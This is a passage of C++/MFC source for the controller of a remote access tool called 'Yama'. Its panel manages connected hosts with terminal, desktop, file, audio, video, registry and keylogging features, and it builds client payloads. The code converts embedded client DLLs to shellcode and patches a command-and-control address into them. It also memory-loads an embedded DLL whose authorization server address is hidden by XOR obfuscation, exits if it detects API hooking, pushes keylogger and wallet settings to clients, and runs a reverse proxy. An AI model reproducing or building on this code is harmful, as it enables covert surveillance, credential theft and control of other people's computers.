        !m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN)) { //创建一个工具条  加载资源
        return;
    }
    m_ToolBar.LoadTrueColorToolBar
    (
        48,    //加载真彩工具条
        IDB_BITMAP_MAIN,
        IDB_BITMAP_MAIN,
        IDB_BITMAP_MAIN
    );  //和我们的位图资源相关联
    RECT Rect,RectMain;
    GetWindowRect(&RectMain);   //得到整个窗口的大小
    Rect.left=0;
    Rect.top=0;
    Rect.bottom=80;
    Rect.right=RectMain.right-RectMain.left+10;
    m_ToolBar.MoveWindow(&Rect,TRUE);

    m_ToolBar.SetButtonText(0,"终端管理");     //在位图的下面添加文件
    m_ToolBar.SetButtonText(1,"进程管理");
    m_ToolBar.SetButtonText(2,"窗口管理");
    m_ToolBar.SetButtonText(3,"桌面管理");
    m_ToolBar.SetButtonText(4,"文件管理");
    m_ToolBar.SetButtonText(5,"语音管理");
    m_ToolBar.SetButtonText(6,"视频管理");
    m_ToolBar.SetButtonText(7,"服务管理");
    m_ToolBar.SetButtonText(8,"注册表管理");
    m_ToolBar.SetButtonText(9, "键盘记录");
    m_ToolBar.SetButtonText(10,"参数设置");
    m_ToolBar.SetButtonText(11,"生成服务端");
    m_ToolBar.SetButtonText(12,"帮助");
    RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //显示
}


VOID CMy2015RemoteDlg::InitControl()
{
    //专属函数
    m_selectedGroup = "default";
    m_GroupTab.InsertItem(0, _T("default"));

    CRect rect;
    GetWindowRect(&rect);
    rect.bottom+=20;
    MoveWindow(rect);
    auto style = LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_DOUBLEBUFFER | LVS_EX_HEADERDRAGDROP | LVS_EX_LABELTIP;
    for (int i = 0; i<g_Column_Count_Online; ++i) {
        m_CList_Online.InsertColumn(i, g_Column_Data_Online[i].szTitle,LVCFMT_CENTER,g_Column_Data_Online[i].nWidth);

        g_Column_Online_Width+=g_Column_Data_Online[i].nWidth;
    }
    m_CList_Online.ModifyStyle(0, LVS_SHOWSELALWAYS);
    m_CList_Online.SetExtendedStyle(style);
    m_CList_Online.SetParent(&m_GroupTab);
    m_CList_Online.ModifyStyle(WS_HSCROLL, 0);

    for (int i = 0; i < g_Column_Count_Message; ++i) {
        m_CList_Message.InsertColumn(i, g_Column_Data_Message[i].szTitle, LVCFMT_LEFT,g_Column_Data_Message[i].nWidth);
        g_Column_Message_Width+=g_Column_Data_Message[i].nWidth;
    }

    m_CList_Message.ModifyStyle(0, LVS_SHOWSELALWAYS);
    m_CList_Message.SetExtendedStyle(style);
    m_CList_Message.ModifyStyle(WS_HSCROLL, 0);
}


VOID CMy2015RemoteDlg::TestOnline()
{
    ShowMessage("操作成功", "软件初始化成功...");
}


std::vector<CString> SplitCString(CString strData)
{
    std::vector<CString> vecItems;
    CString strItem;
    int i = 0;

    while (AfxExtractSubString(strItem, strData, i, _T('|'))) {
        vecItems.push_back(strItem);  // Add to vector
        i++;
    }
    return vecItems;
}


VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS,
                               CString strCPU, CString strVideo, CString strPing, CString ver,
                               CString startTime, const std::vector<std::string>& v, CONTEXT_OBJECT * ContextObject)
{
    auto arr = StringToVector(strPCName.GetString(), '/', 2);
    strPCName = arr[0].c_str();
    auto groupName = arr[1];

    CString install = v[RES_INSTALL_TIME].empty() ? "?" : v[RES_INSTALL_TIME].c_str();
    CString path = v[RES_FILE_PATH].empty() ? "?" : v[RES_FILE_PATH].c_str();
    CString data[ONLINELIST_MAX] = { strIP, strAddr, "", strPCName, strOS, strCPU, strVideo, strPing,
                                     ver, install, startTime, v[RES_CLIENT_TYPE].empty() ? "?" : v[RES_CLIENT_TYPE].c_str(), path,
                                     v[RES_CLIENT_PUBIP].empty() ? strIP : v[RES_CLIENT_PUBIP].c_str(),
                                   };
    auto id = CONTEXT_OBJECT::CalculateID(data);
    bool modify = false;
    CString loc = GetClientMapData(id, MAP_LOCATION);
    if (loc.IsEmpty()) {
        loc = v[RES_CLIENT_LOC].c_str();
        if (loc.IsEmpty()) {
            IPConverter cvt;
            loc = cvt.GetGeoLocation(data[ONLINELIST_IP].GetString()).c_str();
        }
        if (!loc.IsEmpty()) {
            modify = true;
            SetClientMapData(id, MAP_LOCATION, loc);
        }
    }
    bool flag = strIP == "127.0.0.1" && !v[RES_CLIENT_PUBIP].empty();
    data[ONLINELIST_IP] = flag ? v[RES_CLIENT_PUBIP].c_str() : strIP;
    data[ONLINELIST_LOCATION] = loc;
    ContextObject->SetClientInfo(data, v);
    ContextObject->SetID(id);
    ContextObject->SetGroup(groupName);

    EnterCriticalSection(&m_cs);

    if (!groupName.empty() && m_GroupList.end() == m_GroupList.find(groupName)) {
        m_GroupTab.InsertItem(m_GroupList.size(), groupName.c_str());
        m_GroupList.insert(groupName);
    }

    for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
        auto ctx = *i;
        if (ctx == ContextObject) {
            LeaveCriticalSection(&m_cs);
            Mprintf("上线消息 - 主机已经存在 [1]: same context. IP= %s\n", data[ONLINELIST_IP]);
            return;
        }
        if (ctx->GetClientID() == id && !ctx->GetClientData(ONLINELIST_IP).IsEmpty()) {
            LeaveCriticalSection(&m_cs);
            Mprintf("上线消息 - 主机已经存在 [2]: %llu. IP= %s. Path= %s\n", id, data[ONLINELIST_IP], path);
            return;
        }
    }

    if (modify)
        SaveToFile(m_ClientMap, GetDbPath());
    auto& m = m_ClientMap[ContextObject->ID];
    m_HostList.insert(ContextObject);
    if (groupName == m_selectedGroup || (groupName.empty() && m_selectedGroup == "default")) {
        int i = m_CList_Online.InsertItem(m_CList_Online.GetItemCount(), data[ONLINELIST_IP]);
        for (int n = ONLINELIST_ADDR; n <= ONLINELIST_CLIENTTYPE; n++) {
            n == ONLINELIST_COMPUTER_NAME ?
            m_CList_Online.SetItemText(i, n, m.GetNote()[0] ? m.GetNote() : data[n]) :
                          m_CList_Online.SetItemText(i, n, data[n].IsEmpty() ? "?" : data[n]);
        }
        m_CList_Online.SetItemData(i, (DWORD_PTR)ContextObject);
    }
    std::string tip = flag ? " (" + v[RES_CLIENT_PUBIP] + ") " : "";
    ShowMessage("操作成功",strIP + tip.c_str() + "主机上线[" + loc + "]");

	CharMsg *title =  new CharMsg("主机上线");
	CharMsg *text = new CharMsg(strIP + CString(tip.c_str()) + _T(" 主机上线 [") + loc + _T("]"));
    LeaveCriticalSection(&m_cs);
    Mprintf("主机[%s]上线: %s\n", v[RES_CLIENT_PUBIP].empty() ? strIP : v[RES_CLIENT_PUBIP].c_str(),
            std::to_string(id).c_str());
    SendMasterSettings(ContextObject);
    if (m_needNotify && (GetTickCount() - g_StartTick > 30*1000))
        PostMessageA(WM_SHOWNOTIFY, WPARAM(title), LPARAM(text));
    else {
        delete title;
        delete text;
    }
}

LRESULT CMy2015RemoteDlg::OnShowNotify(WPARAM wParam, LPARAM lParam) {
    CharMsg* title = (CharMsg*)wParam, * text = (CharMsg*)lParam;

    if (::IsWindow(m_Nid.hWnd)) {
        NOTIFYICONDATA nidCopy = m_Nid;
        nidCopy.cbSize = sizeof(NOTIFYICONDATA);
        nidCopy.uFlags |= NIF_INFO;
        nidCopy.dwInfoFlags = NIIF_INFO;
        lstrcpynA(nidCopy.szInfoTitle, title->data, sizeof(nidCopy.szInfoTitle));
        lstrcpynA(nidCopy.szInfo, text->data, sizeof(nidCopy.szInfo));
        nidCopy.uTimeout = 3000;
        Shell_NotifyIcon(NIM_MODIFY, &nidCopy);
        SetTimer(TIMER_CLEAR_BALLOON, nidCopy.uTimeout, nullptr);
    }
	if (title->needFree) delete title;
	if (text->needFree) delete text;
    return S_OK;
}

LRESULT CMy2015RemoteDlg::OnShowMessage(WPARAM wParam, LPARAM lParam)
{
    if (wParam && !lParam) {
        CharMsg* msg = (CharMsg*)wParam;
        ShowMessage("提示信息", msg->data);
        if (msg->needFree) delete msg;
        return S_OK;
    }
    std::string pwd = THIS_CFG.GetStr("settings", "Password");
    if (pwd.empty())
        ShowMessage("授权提醒", "程序可能有使用限制，请联系管理员请求授权");

    if (wParam && lParam) {
        uint32_t recvLow = (uint32_t)wParam;
        uint32_t recvHigh = (uint32_t)lParam;
        uint64_t restored = ((uint64_t)recvHigh << 32) | recvLow;
        if (restored != m_superID)
            THIS_APP->UpdateMaxConnection(3+time(0)%5);
    }
    return S_OK;
}

VOID CMy2015RemoteDlg::ShowMessage(CString strType, CString strMsg)
{
    AUTO_TICK(200, "");
    CTime Timer = CTime::GetCurrentTime();
    CString strTime= Timer.Format("%H:%M:%S");

    m_CList_Message.InsertItem(0, strType);    //向控件中设置数据
    m_CList_Message.SetItemText(0,1,strTime);
    m_CList_Message.SetItemText(0,2,strMsg);

    CString strStatusMsg;

    EnterCriticalSection(&m_cs);
    int m_iCount = m_CList_Online.GetItemCount();
    LeaveCriticalSection(&m_cs);

    strStatusMsg.Format("有%d个主机在线",m_iCount);
    if (m_StatusBar.GetSafeHwnd())
        m_StatusBar.SetPaneText(0,strStatusMsg);   //在状态条上显示文字
}

LRESULT CMy2015RemoteDlg::OnShowErrMessage(WPARAM wParam, LPARAM lParam)
{
    CString* text = (CString*)wParam;
    CString* title = (CString*)lParam;

    CTime Timer = CTime::GetCurrentTime();
    CString strTime = Timer.Format("%H:%M:%S");

    m_CList_Message.InsertItem(0, title ? *title : "操作错误");
    m_CList_Message.SetItemText(0, 1, strTime);
    m_CList_Message.SetItemText(0, 2, text ? *text : "内部错误");
    if(title)delete title;
    if(text)delete text;

    return S_OK;
}

extern "C" BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction,
                                   LPVOID userData, DWORD userLength, DWORD flags, LPSTR * outBytes, DWORD * outLength);

bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuffer, int ulOriginalLength, bool align=false)
{
    if (originBuffer[0] == 'M' && originBuffer[1] == 'Z') {
        LPSTR finalShellcode = NULL;
        DWORD finalSize;
        if (!ConvertToShellcode(originBuffer, ulOriginalLength, NULL, NULL, 0, 0x1, &finalShellcode, &finalSize)) {
            return false;
        }
        int padding = align ? ALIGN16(finalSize) - finalSize : 0;
        compressedBuffer = new BYTE[finalSize + padding];
        memset(compressedBuffer + finalSize, 0, padding);
        ulTotalSize = finalSize;

        memcpy(compressedBuffer, finalShellcode, finalSize);
        free(finalShellcode);

        return true;
    }
    return false;
}

Buffer* ReadKernelDll(bool is64Bit, bool isDLL=true, const std::string &addr="")
{
    BYTE* szBuffer = NULL;
    int dwFileSize = 0;

    // 查找名为 MY_BINARY_FILE 的 BINARY 类型资源
    auto id = is64Bit ? IDR_SERVERDLL_X64 : IDR_SERVERDLL_X86;
    HRSRC hResource = FindResourceA(NULL, MAKEINTRESOURCE(id), "BINARY");
    if (hResource == NULL) {
        return NULL;
    }
    // 获取资源的大小
    DWORD dwSize = SizeofResource(NULL, hResource);

    // 加载资源
    HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
    if (hLoadedResource == NULL) {
        return NULL;
    }
    // 锁定资源并获取指向资源数据的指针
    LPVOID pData = LockResource(hLoadedResource);
    if (pData == NULL) {
        return NULL;
    }
    LPBYTE srcData = (LPBYTE)pData;
    int srcLen = dwSize;
    if (!isDLL) { // Convert DLL -> Shell code.
        if (!MakeShellcode(srcData, srcLen, (LPBYTE)pData, dwSize)) {
            Mprintf("MakeShellcode failed \n");
            return false;
        }
    }
    dwFileSize = srcLen;
    int bufSize = sizeof(int) + dwFileSize + 2;
    int padding = ALIGN16(bufSize) - bufSize;
    szBuffer = new BYTE[bufSize + padding];
    szBuffer[0] = CMD_DLLDATA;
    szBuffer[1] = isDLL ? MEMORYDLL : SHELLCODE;
    memcpy(szBuffer + 2, &dwFileSize, sizeof(int));
    memcpy(szBuffer + 2 + sizeof(int), srcData, dwFileSize);
    memset(szBuffer + 2 + sizeof(int) + dwFileSize, 0, padding);
    // CMD_DLLDATA + SHELLCODE + dwFileSize + pData
    std::string s(skCrypt(FLAG_FINDEN)), ip, port;
    int offset = MemoryFind((char*)szBuffer, s.c_str(), dwFileSize, s.length());
    if (offset != -1) {
        CONNECT_ADDRESS* server = (CONNECT_ADDRESS*)(szBuffer + offset);
        if (!addr.empty()) {
            splitIpPort(addr, ip, port);
            server->SetServer(ip.c_str(), atoi(port.c_str()));
            server->SetAdminId(GetMasterHash().c_str());
        }
        if (g_2015RemoteDlg->m_superID % 313 == 0) {
            server->iHeaderEnc = PROTOCOL_HELL;
            // TODO: UDP 协议不稳定
            server->protoType = PROTO_TCP;
        }
        server->SetType(isDLL ? CLIENT_TYPE_MEMDLL : CLIENT_TYPE_SHELLCODE);
        memcpy(server->pwdHash, GetPwdHash().c_str(), 64);
    }
    auto md5 = CalcMD5FromBytes(szBuffer + 2 + sizeof(int), dwFileSize);
    auto ret = new Buffer(szBuffer, bufSize + padding, padding, md5);
    delete[] szBuffer;
    if (srcData != pData)
        SAFE_DELETE_ARRAY(srcData);
    return ret;
}

bool IsAddressInSystemModule(void* addr, const std::string& expectedModuleName)
{
    MEMORY_BASIC_INFORMATION mbi = {};
    if (VirtualQuery(addr, &mbi, sizeof(mbi)) == 0)
        return false;

    char modPath[MAX_PATH] = {};
    if (GetModuleFileNameA((HMODULE)mbi.AllocationBase, modPath, MAX_PATH) == 0)
        return false;

    std::string path = modPath;

    // 合法跳转：仍在指定模块或 system32 下
    return (path.find(expectedModuleName) != std::string::npos ||
            path.find("System32") != std::string::npos ||
            path.find("SysWOW64") != std::string::npos);
}

bool IsFunctionReallyHooked(const char* dllName, const char* funcName)
{
    HMODULE hMod = GetModuleHandleA(dllName);
    if (!hMod) return true;

    FARPROC pFunc = GetProcAddress(hMod, funcName);
    if (!pFunc) return true;

    BYTE* p = (BYTE*)pFunc;

#ifdef _WIN64
    // 64 位：检测 FF 25 xx xx xx xx => JMP [RIP+rel32]
    if (p[0] == 0xFF && p[1] == 0x25) {
        INT32 relOffset = *(INT32*)(p + 2);
        uintptr_t* pJumpPtr = (uintptr_t*)(p + 6 + relOffset);

        if (!IsBadReadPtr(pJumpPtr, sizeof(void*))) {
            void* realTarget = (void*)(*pJumpPtr);
            if (!IsAddressInSystemModule(realTarget, dllName))
                return true; // 跳到未知模块，可能是 Hook
        }
    }

    // JMP rel32 (E9)
    if (p[0] == 0xE9) {
        INT32 rel = *(INT32*)(p + 1);
        void* target = (void*)(p + 5 + rel);
        if (!IsAddressInSystemModule(target, dllName))
            return true;
    }

#else
    // 32 位：检测 FF 25 xx xx xx xx => JMP [abs addr]
    if (p[0] == 0xFF && p[1] == 0x25) {
        uintptr_t* pJumpPtr = *(uintptr_t**)(p + 2);
        if (!IsBadReadPtr(pJumpPtr, sizeof(void*))) {
            void* target = (void*)(*pJumpPtr);
            if (!IsAddressInSystemModule(target, dllName))
                return true;
        }
    }

    // JMP rel32
    if (p[0] == 0xE9) {
        INT32 rel = *(INT32*)(p + 1);
        void* target = (void*)(p + 5 + rel);
        if (!IsAddressInSystemModule(target, dllName))
            return true;
    }
#endif

    // 检测 PUSH addr; RET
    if (p[0] == 0x68 && p[5] == 0xC3) {
        void* target = *(void**)(p + 1);
        if (!IsAddressInSystemModule(target, dllName))
            return true;
    }

    return false; // 未发现 Hook
}

// 关闭启动画面的辅助函数
static void CloseSplash()
{
    CSplashDlg* pSplash = THIS_APP->GetSplash();
    if (pSplash) {
        THIS_APP->SetSplash(nullptr);
        if (pSplash->GetSafeHwnd()) {
            pSplash->DestroyWindow();
        }
        delete pSplash;
    }
}

BOOL CMy2015RemoteDlg::OnInitDialog()
{
#define UPDATE_SPLASH(percent, text) \
    do { \
        CSplashDlg* pSplash = THIS_APP->GetSplash(); \
        if (pSplash && pSplash->GetSafeHwnd()) { \
            pSplash->UpdateProgressDirect(percent, _T(text)); \
        } \
    } while(0)

    AUTO_TICK(500, "");
    CDialogEx::OnInitDialog();

    UPDATE_SPLASH(15, "正在注册主控信息...");
    THIS_CFG.SetStr("settings", "MainWnd", std::to_string((uint64_t)GetSafeHwnd()));
    THIS_CFG.SetStr("settings", "SN", getDeviceID(GetHardwareID()));
    THIS_CFG.SetStr("settings", "PwdHash", GetPwdHash());
    THIS_CFG.SetStr("settings", "MasterHash", GetMasterHash());

    UPDATE_SPLASH(20, "正在初始化文件上传模块...");
    int ret = InitFileUpload(GetHMAC(), 64, 50, Logf);
    g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, AfxGetInstanceHandle(), 0);

    UPDATE_SPLASH(25, "正在初始化视频墙...");
    m_GroupList = {"default"};
    // Grid 容器
    int size = THIS_CFG.GetInt("settings", "VideoWallSize");
    size = max(size, 1);
    if (size > 1) {
        m_gridDlg = new CGridDialog();
        m_gridDlg->Create(IDD_GRID_DIALOG, GetDesktopWindow());
        m_gridDlg->ShowWindow(SW_HIDE);
        m_gridDlg->SetGrid(size, size);
    }

    UPDATE_SPLASH(30, "正在验证配置...");
    if (!IsPwdHashValid()) {
        THIS_CFG.SetStr("settings", "superAdmin", "");
        THIS_CFG.SetStr("settings", "Password", "");
        THIS_CFG.SetInt("settings", "MaxConnection", 2);
        THIS_APP->UpdateMaxConnection(2);
    }
    if (GetPwdHash() == GetMasterHash()) {
        auto pass = THIS_CFG.GetStr("settings", "superAdmin");
        if (hashSHA256(pass) == GetPwdHash()) {
            m_superPass = pass;
        } else {
            THIS_CFG.SetStr("settings", "superAdmin", "");
        }
    }

    UPDATE_SPLASH(35, "正在加载客户端数据库...");
    // 将"关于..."菜单项添加到系统菜单中。
    SetWindowText(_T("Yama"));
    LoadFromFile(m_ClientMap, GetDbPath());

    // IDM_ABOUTBOX 必须在系统命令范围内。
    ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
    ASSERT(IDM_ABOUTBOX < 0xF000);

    CMenu* pSysMenu = GetSystemMenu(FALSE);
    if (pSysMenu != NULL) {
        BOOL bNameValid;
        CString strAboutMenu;
        bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
        ASSERT(bNameValid);
        if (!strAboutMenu.IsEmpty()) {
            pSysMenu->AppendMenu(MF_SEPARATOR);
            pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
        }
    }

    UPDATE_SPLASH(40, "正在加载授权模块...");
    // 主控程序公网IP
    std::string ip = THIS_CFG.GetStr("settings", "master", "");
    int port = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
    std::string master = ip.empty() ? "" : ip + ":" + std::to_string(port);
    const Validation* v = GetValidation();
    if (!(strlen(v->Admin) && v->Port > 0)) {
        // IMPORTANT: For authorization only.
        // NO NOT CHANGE: The program may not work if following code changed.
        PrintableXORCipher cipher;
        char buf1[] = { "? &!x1:x<!{<6 " }, buf2[] = { 'a','a','f',0 };
        cipher.process(buf1, strlen(buf1));
        cipher.process(buf2, strlen(buf2));
        static Validation test(99999, buf1, atoi(buf2));
        v = &test;
    }
    if (strlen(v->Admin) && v->Port > 0) {
        DWORD size = 0;
        LPBYTE data = ReadResource(sizeof(void*) == 8 ? IDR_TINYRUN_X64 : IDR_TINYRUN_X86, size);
        if (data) {
            int offset = MemoryFind((char*)data, FLAG_FINDEN, size, strlen(FLAG_FINDEN));
            if (offset != -1) {
                CONNECT_ADDRESS* p = (CONNECT_ADDRESS*)(data + offset);
                p->SetServer(v->Admin, v->Port);
                p->SetAdminId(GetMasterHash().c_str());
                p->iType = CLIENT_TYPE_MEMDLL;
                p->parentHwnd = (uint64_t)GetSafeHwnd();
                memcpy(p->pwdHash, GetPwdHash().c_str(), 64);
                m_tinyDLL = MemoryLoadLibrary(data, size);
            }
            SAFE_DELETE_ARRAY(data);
        }
    }

    UPDATE_SPLASH(50, "正在加载内核模块 (x86 DLL)...");
    g_2015RemoteDlg = this;
    m_ServerDLL[PAYLOAD_DLL_X86] = ReadKernelDll(false, true, master);

    UPDATE_SPLASH(55, "正在加载内核模块 (x64 DLL)...");
    m_ServerDLL[PAYLOAD_DLL_X64] = ReadKernelDll(true, true, master);

    UPDATE_SPLASH(60, "正在加载内核模块 (x86 Bin)...");
    m_ServerBin[PAYLOAD_DLL_X86] = ReadKernelDll(false, false, master);

    UPDATE_SPLASH(65, "正在加载内核模块 (x64 Bin)...");
    m_ServerBin[PAYLOAD_DLL_X64] = ReadKernelDll(true, false, master);

    // 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
    //  执行此操作
    SetIcon(m_hIcon, TRUE);			// 设置大图标
    SetIcon(m_hIcon, FALSE);		// 设置小图标

    UPDATE_SPLASH(70, "正在创建工具栏...");
    // TODO: 在此添加额外的初始化代码
    isClosed = FALSE;

    CreateToolBar();
    InitControl();

    UPDATE_SPLASH(75, "正在创建界面组件...");
    CreatStatusBar();
    CreateNotifyBar();
    CreateSolidMenu();

    UPDATE_SPLASH(80, "正在加载配置...");
    std::string nPort = THIS_CFG.GetStr("settings", "ghost", "6543");
    m_nMaxConnection = 2;
    std::string pwd = THIS_CFG.GetStr("settings", "Password");
    auto arr = StringToVector(pwd, '-', 6);
    if (arr.size() == 7) {
        m_nMaxConnection = atoi(arr[2].c_str());
    } else {
        int nMaxConnection = THIS_CFG.GetInt("settings", "MaxConnection");
        m_nMaxConnection = nMaxConnection <= 0 ? 10000 : nMaxConnection;
    }
    const std::string method = THIS_CFG.GetStr("settings", "UDPOption", "0");
    int m = atoi(THIS_CFG.GetStr("settings", "ReportInterval", "5").c_str());
    int n = THIS_CFG.GetInt("settings", "SoftwareDetect");
    int usingFRP = master.empty() ? 0 : THIS_CFG.GetInt("frp", "UseFrp");
    m_settings = { m, sizeof(void*) == 8, __DATE__, n, usingFRP };
    auto w = THIS_CFG.GetStr("settings", "wallet", "");
    memcpy(m_settings.WalletAddress, w.c_str(), w.length());
    m_settings.EnableKBLogger = THIS_CFG.GetInt("settings", "KeyboardLog", 0);
    m_settings.EnableLog = THIS_CFG.GetInt("settings", "EnableLog", 0);
    CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
    SubMenu->CheckMenuItem(ID_PARAM_KBLOGGER, m_settings.EnableKBLogger ? MF_CHECKED : MF_UNCHECKED);
    m_needNotify = THIS_CFG.GetInt("settings", "LoginNotify", 0);
    SubMenu->CheckMenuItem(ID_PARAM_LOGIN_NOTIFY, m_needNotify ? MF_CHECKED : MF_UNCHECKED);
    SubMenu->CheckMenuItem(ID_PARAM_ENABLE_LOG, m_settings.EnableLog ? MF_CHECKED : MF_UNCHECKED);
    m_bHookWIN = THIS_CFG.GetInt("settings", "HookWIN", 0);
    SubMenu->CheckMenuItem(ID_HOOK_WIN, m_bHookWIN ? MF_CHECKED : MF_UNCHECKED);
	m_runNormal = THIS_CFG.GetInt("settings", "RunNormal", 0);
    SubMenu->CheckMenuItem(ID_RUNAS_SERVICE, !m_runNormal ? MF_CHECKED : MF_UNCHECKED);
    std::map<int, std::string> myMap = {{SOFTWARE_CAMERA, "摄像头"}, {SOFTWARE_TELEGRAM, "电报" }};
    std::string str = myMap[n];
    LVCOLUMN lvColumn;
    memset(&lvColumn, 0, sizeof(LVCOLUMN));
    lvColumn.mask = LVCF_TEXT;
    lvColumn.pszText = (char*)str.data();
    m_CList_Online.SetColumn(ONLINELIST_VIDEO, &lvColumn);
    timeBeginPeriod(1);
    if (IsFunctionReallyHooked("user32.dll","SetTimer") || IsFunctionReallyHooked("user32.dll", "KillTimer")) {
        THIS_APP->MessageBox("FUCK!!! 请勿HOOK此程序!", "提示", MB_ICONERROR);
        ExitProcess(-1);
        return FALSE;
    }
    int tm = THIS_CFG.GetInt("settings", "Notify", 10);
    tm = min(tm, 10);
#ifdef _DEBUG
    SetTimer(TIMER_CHECK, max(1, tm) * 1000, NULL);
#else
    SetTimer(TIMER_CHECK, max(1, tm) * 60 * 1000, NULL);
#endif

    UPDATE_SPLASH(85, "正在启动FRP代理...");
    m_hFRPThread = CreateThread(NULL, 0, StartFrpClient, this, NULL, NULL);

    UPDATE_SPLASH(90, "正在启动网络服务...");
    // 最后启动SOCKET
    if (!Activate(nPort, m_nMaxConnection, method)) {
        CloseSplash();
        OnCancel();
        return FALSE;
    }

    UPDATE_SPLASH(100, "启动完成!");
    CloseSplash();

    return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

DWORD WINAPI CMy2015RemoteDlg::StartFrpClient(LPVOID param)
{
    CMy2015RemoteDlg* This = (CMy2015RemoteDlg*)param;
    IPConverter cvt;
    std::string ip = THIS_CFG.GetStr("settings", "master", "");
    CString tip = !ip.empty() && ip != cvt.getPublicIP() ?
                  CString(ip.c_str()) + " 必须是\"公网IP\"或反向代理服务器IP" :
                  "请设置\"公网IP\"，或使用反向代理服务器的IP";
    CharMsg* msg = new CharMsg(tip);
    This->PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
    int usingFRP = 0;
#ifdef _WIN64
    usingFRP = ip.empty() ? 0 : THIS_CFG.GetInt("frp", "UseFrp");
#else
    SAFE_CLOSE_HANDLE(This->m_hFRPThread);
    This->m_hFRPThread = NULL;
    return 0x20250820;
#endif
    if (usingFRP) {
        This->m_frpStatus = STATUS_RUN;
    }

    Mprintf("[FRP] Proxy thread start running\n");

    do {
        DWORD size = 0;
        LPBYTE frpc = ReadResource(IDR_BINARY_FRPC, size);
        if (frpc == nullptr) {
            Mprintf("Failed to read FRP DLL\n");
            break;
        }
        HMEMORYMODULE hDLL = MemoryLoadLibrary(frpc, size);
        SAFE_DELETE_ARRAY(frpc);
        if (hDLL == NULL) {
            Mprintf("Failed to load FRP DLL\n");
            break;
        }
        typedef int (*Run)(char* cstr, int* ptr);
        Run run = (Run)MemoryGetProcAddress(hDLL, "Run");
        if (!run) {
            Mprintf("Failed to get FRP function\n");
            MemoryFreeLibrary(hDLL);
            break;
        }
        std::string s = GetFrpSettingsPath();
        int n = run((char*)s.c_str(), &(This->m_frpStatus));
        if (n) {
            Mprintf("Failed to run FRP function\n");
            This->PostMessage(WM_SHOWERRORMSG,(WPARAM)new CString("反向代理: 公网IP和代理设置是否正确? FRP 服务端是否运行?"));
        }
        // Free FRP DLL will cause crash
        // Do NOT use MemoryFreeLibrary and 528 bytes memory leak detected when exiting master
        // MemoryFreeLibrary(hDLL);
    } while (false);

    SAFE_CLOSE_HANDLE(This->m_hFRPThread);
    This->m_hFRPThread = NULL;
    Mprintf("[FRP] Proxy thread stop running\n");

    return 0x20250731;
}

void CMy2015RemoteDlg::ApplyFrpSettings()
{
    auto master = THIS_CFG.GetStr("settings", "master");
    if (master.empty()) return;

    std::string path = GetFrpSettingsPath();
    DeleteFileA(path.c_str());
    config cfg(path);
    cfg.SetStr("common", "server_addr", master);
    cfg.SetInt("common", "server_port", THIS_CFG.GetInt("frp", "server_port", 7000));
    cfg.SetStr("common", "token", THIS_CFG.GetStr("frp", "token"));
    cfg.SetStr("common", "log_file", THIS_CFG.GetStr("frp", "log_file", "./frpc.log"));

    auto ports = THIS_CFG.GetStr("settings", "ghost", "6543");
    auto arr = StringToVector(ports, ';');
    for (int i = 0; i < arr.size(); ++i) {
        auto tcp = "YAMA-TCP-" + arr[i];
        cfg.SetStr(tcp, "type", "tcp");
        cfg.SetStr(tcp, "local_port", arr[i]);
        cfg.SetStr(tcp, "remote_port", arr[i]);

        auto udp = "YAMA-UDP-" + arr[i];
        cfg.SetStr(udp, "type", "udp");
        cfg.SetStr(udp, "local_port", arr[i]);
        cfg.SetStr(udp, "remote_port", arr[i]);
    }
}

void CMy2015RemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
    if ((nID & 0xFFF0) == IDM_ABOUTBOX) {
        CAboutDlg dlgAbout;
        dlgAbout.DoModal();
    } else {
        CDialogEx::OnSysCommand(nID, lParam);
    }
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CMy2015RemoteDlg::OnPaint()
{
    if (IsIconic()) {
        CPaintDC dc(this); // 用于绘制的设备上下文

        SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

        // 使图标在工作区矩形中居中
        int cxIcon = GetSystemMetrics(SM_CXICON);
        int cyIcon = GetSystemMetrics(SM_CYICON);
        CRect rect;
        GetClientRect(&rect);
        int x = (rect.Width() - cxIcon + 1) / 2;
        int y = (rect.Height() - cyIcon + 1) / 2;

        // 绘制图标
        dc.DrawIcon(x, y, m_hIcon);
    } else {
        CDialogEx::OnPaint();
    }
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CMy2015RemoteDlg::OnQueryDragIcon()
{
    return static_cast<HCURSOR>(m_hIcon);
}

void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
{
    CDialogEx::OnSize(nType, cx, cy);

    // TODO: 在此处添加消息处理程序代码
    if (SIZE_MINIMIZED==nType) {
        return;
    }
    EnterCriticalSection(&m_cs);
    if (m_CList_Online.m_hWnd!=NULL) { //（控件也是窗口因此也有句柄）
        CRect rc;
        rc.left = 1;          //列表的左坐标
        rc.top  = 80;         //列表的上坐标
        rc.right  =  cx-1;    //列表的右坐标
        rc.bottom = cy-160;   //列表的下坐标
        m_GroupTab.MoveWindow(rc);

        CRect rcInside;
        m_GroupTab.GetClientRect(&rcInside);
        m_GroupTab.AdjustRect(FALSE, &rcInside);
        rcInside.bottom -= 1;
        m_CList_Online.MoveWindow(&rcInside);

        auto total = rcInside.Width() - 24;
        for(int i=0; i<g_Column_Count_Online; ++i) {        //遍历每一个列
            double Temp=g_Column_Data_Online[i].nWidth;     //得到当前列的宽度   138
